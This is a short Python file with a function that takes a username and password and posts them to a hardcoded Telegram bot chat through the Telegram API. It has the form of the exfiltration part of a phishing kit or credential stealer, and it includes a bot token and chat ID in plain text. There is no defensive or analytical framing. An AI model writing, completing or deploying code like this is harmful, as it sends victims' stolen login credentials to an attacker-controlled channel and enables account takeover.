import requests

BOT_TOKEN = '8434307879:AAFG2h5Z59_7JPziceP4E2Exksk7wuVmuXM'
CHAT_ID = '7527317470'

def send_to_telegram(username, password):
    message = f"📩 Username: {username}\n🔑 Password: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    response = requests.post(url, data=payload)
    return response.status_code == 200
